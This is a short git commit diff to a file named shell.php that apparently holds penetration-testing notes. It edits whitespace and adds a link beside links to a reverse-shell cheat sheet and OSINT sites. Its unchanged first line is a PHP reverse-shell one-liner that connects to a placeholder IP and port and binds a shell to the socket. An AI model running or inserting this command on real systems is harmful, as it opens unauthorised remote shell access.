c35bb757d8edc82fadba57f6ac848867c7f45865
i0xid <97521668+kostya300@users.noreply.github.com>
2024-05-13 12:00:00 +0500

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,7 +1,6 @@
 php -r '$sock=fsockopen("<ip>",<port>);exec("sh <&3 >&3 2>&3");
 
 
-
 https://www.stationx.net/reverse-shell-cheat-sheet/
-
-  https://osintframework.com/
+https://osintframework.com/
+http://ffuf.me/
